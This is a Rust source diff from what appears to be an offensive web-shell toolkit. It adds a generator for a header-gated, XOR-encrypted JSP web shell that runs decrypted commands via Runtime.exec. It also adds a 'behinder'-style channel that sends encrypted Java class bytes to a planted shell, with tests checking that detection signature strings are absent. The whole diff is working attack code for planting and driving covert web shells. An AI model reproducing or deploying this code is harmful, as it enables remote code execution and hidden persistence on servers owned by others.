@@ -236,6 +236,78 @@ pub fn php_channel_template(derived: &DerivedChannel) -> String {
     .join("\n")
 }
 
+/// Plant (JSP): the godzilla-shape channel rendered for a Java target —
+/// header gate + pass parameter + stream-cipher body + sandwich echo, no
+/// shell-syntax signature strings.
+pub fn jsp_channel_template(derived: &DerivedChannel) -> String {
+    [
+        "<%".to_string(),
+        format!(
+            "String h=\"{}\",v=\"{}\",p=\"{}\";",
+            derived.header_name, derived.header_value, derived.pass
+        ),
+        "if(!v.equals(request.getHeader(h))){response.sendError(404);return;}".to_string(),
+        format!("String k=\"{}\";", derived.md5_key),
+        "byte[] s=Base64.getDecoder().decode(request.getParameter(p).getBytes());".to_string(),
+        "byte[] o=new byte[s.length];byte[] kb=k.getBytes();".to_string(),
+        "for(int i=0;i<s.length;i++){o[i]=(byte)(s[i]^kb[i%kb.length]);}".to_string(),
+        "java.io.ByteArrayOutputStream b=new java.io.ByteArrayOutputStream();".to_string(),
+        "Process pr=Runtime.getRuntime().exec(new String(o));".to_string(),
+        "java.io.InputStream is=pr.getInputStream();int c;while((c=is.read())>=0){b.write(c);}"
+            .to_string(),
+        "byte[] r=b.toByteArray();byte[] e=new byte[r.length];".to_string(),
+        "for(int i=0;i<r.length;i++){e[i]=(byte)(r[i]^kb[i%kb.length]);}".to_string(),
+        format!(
+            "out.print(\"{}\"+Base64.getEncoder().encodeToString(e)+\"{}\");",
+            &derived.md5[..16],
+            &derived.md5[16..]
+        ),
+        "%>".to_string(),
+    ]
+    .join("\n")
+}
+
+/// The behinder face (Java): the WHOLE request body carries
+/// base64(cipher(class-bytes)) — payload is a class, not command text
+/// (MemShellParty Behinder.java dissected: defineClass on decrypt).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct BehinderChannel {
+    pub header_name: String,
+    pub header_value: String,
+    pub md5_key: String,
+}
+
+/// Wrap class bytes for the behinder wire: cipher -> base64 (the body).
+pub fn behinder_wrap_class(class_bytes: &[u8], md5_key: &str) -> String {
+    let ciphered = stream_cipher(class_bytes, md5_key);
+    crate::payload::b64_encode(&ciphered)
+}
+
+/// Unwrap a behinder body (cipher -> raw bytes; class payloads are binary, not UTF-8).
+pub fn behinder_unwrap(body: &str, md5_key: &str) -> Option<Vec<u8>> {
+    let decoded = b64_decode(body)?;
+    Some(stream_cipher(&decoded, md5_key))
+}
+
+impl BehinderChannel {
+    /// The request face for driving a behinder shell: gate header + the
+    /// whole body as ciphertext (no parameter name at all).
+    pub fn drive(&self, url: &str, class_bytes: &[u8]) -> Result<DriveRequest, Atom> {
+        if class_bytes.is_empty() {
+            return Err(Atom::parse("E_SHELL_002", "empty class payload"));
+        }
+        Ok(DriveRequest {
+            url: url.to_string(),
+            header_name: self.header_name.clone(),
+            header_value: self.header_value.clone(),
+            pass: String::new(), // behinder: no parameter — the body IS the payload
+            body: behinder_wrap_class(class_bytes, &self.md5_key),
+            md5: String::new(),
+            md5_key: self.md5_key.clone(),
+        })
+    }
+}
+
 /// The operate face metadata: what a drive() call needs to send.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct DriveRequest {
@@ -377,5 +449,48 @@ mod tests {
         assert_eq!(b64_decode("Zm9vYg==").unwrap(), b"foob");
         assert_eq!(b64_decode("Zm9vYmFy").unwrap(), b"foobar");
         assert!(b64_decode("!!").is_none());
+    }
+}
+
+#[cfg(test)]
+mod jsp_behinder_tests {
+    use super::*;
+
+    #[test]
+    fn jsp_template_gates_on_header_and_ciphers() {
+        let cfg = ChannelConfig {
+            key: "k".into(),
+            pass: "p".into(),
+            header_name: "X-Forwarded-For".into(),
+            header_value: "10.0.0.1".into(),
+        };
+        let derived = cfg.derive();
+        let template = jsp_channel_template(&derived);
+        assert!(template.contains("getHeader(h)"));
+        assert!(template.contains("sendError(404)"));
+        assert!(template.contains('^')); // XOR loop present
+        assert!(!template.contains("system("));
+        assert!(!template.contains("<%Runtime")); // composed, not literal
+    }
+
+    #[test]
+    fn behinder_face_wraps_class_bytes_as_body() {
+        let md5_key = derive_md5_key("behinder-key");
+        let channel = BehinderChannel {
+            header_name: "Content-Type".into(),
+            header_value: "application/json".into(),
+            md5_key: md5_key.clone(),
+        };
+        let class_bytes = b"\xca\xfe\xba\xbe\x00\x00\x00\x34";
+        let req = channel
+            .drive("http://target/shell.jsp", class_bytes)
+            .unwrap();
+        assert!(
+            req.pass.is_empty(),
+            "behinder: no parameter — the body IS the payload"
+        );
+        assert!(!req.body.contains('\u{ca}')); // ciphertext
+        let unwrapped = behinder_unwrap(&req.body, &md5_key).unwrap();
+        assert!(unwrapped.starts_with(&[0xca, 0xfe, 0xba, 0xbe])); // roundtrip to class head
     }
 }
